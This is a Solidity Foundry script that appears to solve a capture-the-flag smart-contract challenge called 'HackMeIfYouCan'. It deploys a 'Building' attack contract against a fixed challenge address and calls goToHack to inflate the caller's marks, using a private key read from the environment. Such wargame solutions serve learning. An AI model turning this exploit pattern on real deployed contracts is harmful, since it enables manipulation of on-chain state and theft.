// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {HackMeIfYouCan} from "../src/HackMeIfYouCan.sol";
import {Building} from "../src/Building.sol";

contract GoToScript is Script {
    HackMeIfYouCan public hackMeIfYouCan;
    Building public building;

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        hackMeIfYouCan = HackMeIfYouCan(payable(0x9D29D33d4329640e96cC259E141838EB3EB2f1d9));

        building = new Building(address(hackMeIfYouCan));

        building.goToHack(2000);

        console.log("Marks after calling goTo:", hackMeIfYouCan.getMarks(tx.origin));
        vm.stopBroadcast();
    }
}
